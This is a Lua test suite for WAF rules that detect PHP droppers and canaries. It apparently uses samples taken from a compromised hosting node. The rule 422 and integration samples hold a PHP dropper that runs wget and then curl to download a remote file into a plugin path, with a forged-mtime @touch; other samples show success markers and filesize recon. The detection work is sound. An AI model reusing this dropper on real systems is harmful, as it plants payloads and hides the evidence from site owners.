-- Tests for the PHP dropper / canary detector family (rules 421-425).
-- Source workload: 2026-05-19 production /tmp dump from a compromised
-- shared-hosting node. Each detector has positive samples drawn from the
-- real artefacts and negative samples that the rule must NOT fire on.

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local function disable_all_rules()
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then
      waf.set_rule(k, "disabled")
    end
  end
end

local function ctx(body, ct)
  return {
    uri     = "/upload.php",
    args    = "",
    method  = "POST",
    ip      = "203.0.113.7",
    headers = { ["Content-Type"] = ct or "application/x-www-form-urlencoded" },
    body    = body,
  }
end

-- ─────────────────────────────────────────────────────────────────────────────
-- 421 — split-string PHP canary
-- ─────────────────────────────────────────────────────────────────────────────

-- Real-sample positive
do
  disable_all_rules()
  waf.set_rule("rule_php_split_string_canary", "challenge")

  local hit, reason, _ttl, action = waf.check(ctx(
    [[<?php print "fzkjxOHpsxKlyYd"."JElmYumISg";exit;]]))
  check(hit == true,                       "421 real-sample — hit=true")
  check(reason == "WAF_DROPPER:PRINT_CONCAT", "421 real-sample — reason=PRINT_CONCAT (got " .. tostring(reason) .. ")")
  check(action == "challenge",             "421 real-sample — action=challenge")
end

-- echo variant + single quotes
do
  disable_all_rules()
  waf.set_rule("rule_php_split_string_canary", "challenge")

  local hit, reason = waf.check(ctx([[<?php echo 'aa' . 'bb'; exit;]]))
  check(hit == true,                      "421 echo+single — hit=true")
  check(reason == "WAF_DROPPER:ECHO_CONCAT", "421 echo+single — ECHO_CONCAT")
end

-- die variant
do
  disable_all_rules()
  waf.set_rule("rule_php_split_string_canary", "challenge")

  local hit, reason = waf.check(ctx([[<?php die("AA"."BB");]]))
  check(hit == true,                     "421 die — hit=true")
  check(reason == "WAF_DROPPER:DIE_CONCAT", "421 die — DIE_CONCAT")
end

-- Negative: regular PHP code with concat — has `{`/`if`/etc.
do
  disable_all_rules()
  waf.set_rule("rule_php_split_string_canary", "challenge")

  local hit = waf.check(ctx([[<?php
if ($x) { echo "hello" . " world"; }
]]))
  check(hit ~= true, "421 negative — real PHP with control flow does not fire")
end

-- Negative: echo with no concat
do
  disable_all_rules()
  waf.set_rule("rule_php_split_string_canary", "challenge")
  local hit = waf.check(ctx([[<?php echo "hello"; exit;]]))
  check(hit ~= true, "421 negative — single-string echo does not fire")
end

-- Negative: not PHP at all
do
  disable_all_rules()
  waf.set_rule("rule_php_split_string_canary", "challenge")
  local hit = waf.check(ctx([[name=John+Doe&email=a@b.com]]))
  check(hit ~= true, "421 negative — plain form post does not fire")
end

-- Negative: short legit code-snippet save (FP shape) — print+concat but no
-- exit/die terminator. This is the "Code Snippets" / "Insert PHP Snippet"
-- wp-admin POST shape that has no control flow but is not a canary either.
do
  disable_all_rules()
  waf.set_rule("rule_php_split_string_canary", "challenge")
  local hit = waf.check(ctx([[<?php print "Hello, " . "World!";]]))
  check(hit ~= true, "421 negative — print+concat without exit/die does not fire")
end

-- Negative: `die` and `exit` as substrings of other identifiers must not
-- satisfy the exit/die requirement. `died` / `exiting` should not match.
do
  disable_all_rules()
  waf.set_rule("rule_php_split_string_canary", "challenge")
  local hit = waf.check(ctx([[<?php print "process died at " . $time;]]))
  check(hit ~= true, "421 negative — 'died' substring does not satisfy exit/die")
end

-- ─────────────────────────────────────────────────────────────────────────────
-- 422 — wget+curl fallback dropper
-- ─────────────────────────────────────────────────────────────────────────────

-- Real-sample positive (trimmed from the captured .include artefact)
do
  disable_all_rules()
  waf.set_rule("rule_php_dropper_wget_curl", "block")

  local body = [[<?php
$p='/home/x/public_html/wp-content/plugins/x/css/gnuplot.php';
$u='http://45.227.253.162/tmp/wzCpsxbWui';
$fs=1017; $ft=1778835162;
run("wget -O {$p} {$u}"); check($p,$fs,$ft);
run("curl -o {$p} {$u}"); check($p,$fs,$ft);
function check($p,$fs,$ft){ if(file_exists($p)&&filesize($p)==$fs){@touch($p,$ft);die('!success!');} }
die('!ended!');
]]
  local hit, reason, _ttl, action = waf.check(ctx(body))
  check(hit == true,                              "422 real-sample — hit=true")
  check(reason == "WAF_DROPPER:WGET_CURL_FALLBACK", "422 real-sample — reason=WGET_CURL_FALLBACK (got " .. tostring(reason) .. ")")
  check(action == "block",                         "422 real-sample — action=block")
end

-- Negative: wget alone is not enough
do
  disable_all_rules()
  waf.set_rule("rule_php_dropper_wget_curl", "block")
  local hit = waf.check(ctx([[<?php exec("wget -O /tmp/x http://example.com/"); ]]))
  check(hit ~= true, "422 negative — wget-only does not fire")
end

-- Negative: long-form arg without `-o` / `--output` is not enough
do
  disable_all_rules()
  waf.set_rule("rule_php_dropper_wget_curl", "block")
  local hit = waf.check(ctx([[<?php echo "wget"; echo "curl"; filesize($x); @touch($x); ]]))
  check(hit ~= true, "422 negative — no -O/-o args does not fire")
end

-- ─────────────────────────────────────────────────────────────────────────────
-- 423 — !success! / !ended! markers
-- ─────────────────────────────────────────────────────────────────────────────

do
  disable_all_rules()
  waf.set_rule("rule_php_dropper_markers", "challenge")

  local body = [[<?php if (ok()) { die('!success!'); } die('!ended!');]]
  local hit, reason = waf.check(ctx(body))
  check(hit == true,                              "423 markers — hit=true")
  check(reason == "WAF_DROPPER:SUCCESS_ENDED_PAIR", "423 markers — reason")
end

-- Negative: only one marker
do
  disable_all_rules()
  waf.set_rule("rule_php_dropper_markers", "challenge")
  local hit = waf.check(ctx([[<?php die('!success!'); ]]))
  check(hit ~= true, "423 negative — single marker does not fire")
end

-- Negative: markers in prose but no exit/die
do
  disable_all_rules()
  waf.set_rule("rule_php_dropper_markers", "challenge")
  local hit = waf.check(ctx([[note=!success! and !ended! are markers]]))
  check(hit ~= true, "423 negative — prose markers without die/exit do not fire")
end

-- ─────────────────────────────────────────────────────────────────────────────
-- 424 — <fs>…</fs> filesize recon
-- ─────────────────────────────────────────────────────────────────────────────

do
  disable_all_rules()
  waf.set_rule("rule_php_filesize_recon", "challenge")

  local body = [[<?php $path=$_SERVER['SCRIPT_FILENAME']; die("<fs>".filesize($path)."</fs><p>{$path}</p>");]]
  local hit, reason = waf.check(ctx(body))
  check(hit == true,                       "424 fs-recon — hit=true")
  check(reason == "WAF_DROPPER:FS_TAG_RECON", "424 fs-recon — reason")
end

-- Negative: bare filesize without the <fs> framing tag
do
  disable_all_rules()
  waf.set_rule("rule_php_filesize_recon", "challenge")
  local hit = waf.check(ctx([[<?php echo filesize($_SERVER['SCRIPT_FILENAME']); ]]))
  check(hit ~= true, "424 negative — filesize without <fs> tag does not fire")
end

-- ─────────────────────────────────────────────────────────────────────────────
-- 425 — @touch() with forged literal mtime
-- ─────────────────────────────────────────────────────────────────────────────

do
  disable_all_rules()
  waf.set_rule("rule_php_touch_antiforensic", "challenge")

  local body = [[<?php if (file_exists($p) && filesize($p) == 1017) { @touch($p, 1678320324); } ]]
  local hit, reason = waf.check(ctx(body))
  check(hit == true,                               "425 antiforensic — hit=true")
  check(reason == "WAF_DROPPER:FORGED_MTIME_TOUCH", "425 antiforensic — reason")
end

-- Negative: legit touch with time() (no `@`, no literal ts)
do
  disable_all_rules()
  waf.set_rule("rule_php_touch_antiforensic", "challenge")
  local hit = waf.check(ctx([[<?php touch($cache_file, time()); file_put_contents($x,$y); ]]))
  check(hit ~= true, "425 negative — bare touch+time() does not fire")
end

-- Negative: `@touch($p)` with no second arg
do
  disable_all_rules()
  waf.set_rule("rule_php_touch_antiforensic", "challenge")
  local hit = waf.check(ctx([[<?php @touch($p); filesize($p); ]]))
  check(hit ~= true, "425 negative — @touch without literal timestamp does not fire")
end

-- ─────────────────────────────────────────────────────────────────────────────
-- Integration: the .include artefact triggers BOTH 422 and 425.
-- Severity aggregation picks the strongest action; both run when at logonly.
-- ─────────────────────────────────────────────────────────────────────────────
do
  disable_all_rules()
  waf.set_rule("rule_php_dropper_wget_curl",  "challenge")
  waf.set_rule("rule_php_touch_antiforensic", "block")

  local body = [[<?php
run("wget -O {$p} {$u}"); check($p,$fs,$ft);
run("curl -o {$p} {$u}"); check($p,$fs,$ft);
function check($p,$fs,$ft){ if(file_exists($p)&&filesize($p)==$fs){@touch($p,1678320324);die('!success!');} }
]]
  local hit, _reason, _ttl, action, hits = waf.check(ctx(body))
  check(hit == true,                  "integration — both rules hit")
  check(action == "block",            "integration — block wins over challenge")
  check(type(hits) == "table" and #hits >= 2, "integration — at least two rule hits recorded")
end

if fails > 0 then
  io.stderr:write(string.format("FAILED %d tests\n", fails))
  os.exit(1)
end
print("ok: cfm_waf dropper/canary tests (421-425)")
